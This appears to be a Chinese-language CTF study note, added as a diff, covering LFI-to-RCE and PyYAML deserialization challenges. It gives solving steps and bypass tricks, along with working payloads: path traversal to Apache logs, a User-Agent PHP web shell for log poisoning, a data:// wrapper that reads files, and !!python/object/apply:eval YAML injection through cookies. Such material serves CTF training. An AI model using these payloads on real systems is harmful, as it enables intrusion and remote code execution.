@@ -1,0 +1,148 @@
+# 🧩 **【题型归纳：LFI & YAML 反序列化】**
+
+---
+
+## **A. LFI（本地文件包含 / RCE）**
+
+### 1. 类型
+
+* LFI / RFI
+* 日志投毒 LFI-RCE
+* 伪协议（php://filter、data://）绕过
+
+### 2. 解题输出思路
+
+1. 探测可控参数，确认文件包含
+2. 尝试路径穿越验证漏洞
+3. 直接读取敏感文件（如 `/etc/passwd`）
+4. 若 PHP 文件被包含且可执行 → 日志投毒触发 RCE
+5. 使用伪协议（data://、php://filter）注入执行
+6. 输出 flag 或抓取响应
+
+### 3. 关注点
+
+* 是否执行 PHP
+* 路径过滤规则
+* 可访问日志路径（Apache/Nginx）
+* 是否允许伪协议
+* 返回值是否被转义
+* 文件路径前缀是否固定
+
+### 4. 通用
+
+#### 通用步骤
+
+* `../../../../../etc/passwd` 等路径穿越
+* 找到回显点
+* 查看 web 根目录结构
+
+* Access.log / auth.log / error.log 注入
+* 利用 data:// 封装字符串注入 PHP
+* 日志投毒结合命令参数
+
+### 5. 方法论
+
+* 定位“可读/可写/可执行”资源
+* 利用现有文件作为攻击面
+* 流程：先读 → 再执行 → 再提权
+
+### 6. 启发性问题
+
+* PHP 文件是否被执行？
+* 可写文件路径是否存在？
+* 日志路径是否可访问？
+* 是否存在二次解析或 include？
+
+### 7. 绕过手法
+
+* 路径双写 / 混合编码（....//....、%252e）
+* URL 编码
+* Base64 / filter 编码
+* 嵌套包含技巧
+
+### 8. 典型 payload
+
+#### 路径穿越 + 日志文件：
+
+```text
+id=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log
+```
+
+#### 日志投毒 User-Agent：
+
+```php
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+访问：
+
+```
+http://target.com/vuln.php?file=access.log&cmd=cat /FLAG.php
+```
+
+#### data:// 伪协议（allow_url_include=On）
+
+```php
+abspath=data://text/plain,<?php echo file_get_contents('/FLAG.txt');die(); ?>
+```
+
+---
+
+## **B. YAML 反序列化（Python / PyYAML）**
+
+### 1. 类型
+
+* Python / PyYAML unsafe_load
+* Cookie / session 存储对象 → Base64 → YAML 注入
+
+### 2. 解题输出思路
+
+1. 解码 Cookie / session
+2. 确认 YAML 格式
+3. 注入 `!!python/object/apply` 或 `!!python/object/new`
+4. 执行命令（eval / os.system / getattr 链）
+5. Base64 编码 payload 写回 Cookie
+6. 从响应或对象字段提取 flag
+
+### 3. 关注点
+
+* 是否使用 safe_load
+* 是否支持 object/apply/new
+* YAML key 是否允许空格或多段
+* Cookie 是否有签名 / 校验
+* 编码格式（中 ISO-8859-1）
+
+### 4. 通用
+
+#### 通用步骤
+
+* 构造最短 RCE 链（apply → os.system）
+* Base64 编码替换 Cookie 内容
+
+### 5. 方法论
+
+* 分析序列化对象 → 找到执行节点
+* 破坏 YAML 树结构 → 诱导解析器走 unsafe 分支
+* 若 eval 被禁用 → 走 getattr / import 链
+
+### 6. 启发性问题
+
+* 反序列化是否无校验？
+* 是否有 apply 或 object 标记？
+* Cookie / session 是否可被伪造？
+* 数据结构是否可控？
+
+### 7. 绕过技巧
+
+* `!!python/object/apply:eval`
+* `!!python/object/new`
+* 利用 `os.environ` 读取环境变量
+* 空键名绕过 YAML 解析错误
+* Base64 包装伪造为合法 Cookie
+
+---
+
+## **C. 定义总结**
+
+* **LFI**：可控路径包含任意文件，若被解析执行（如 PHP），结合日志投毒或伪协议可实现 RCE。
+* **YAML 反序列化**：不安全加载对象（unsafe_load / !!python/object）可执行任意 Python 命令，中通过 Base64 Cookie 注入成功读取 FLAG。
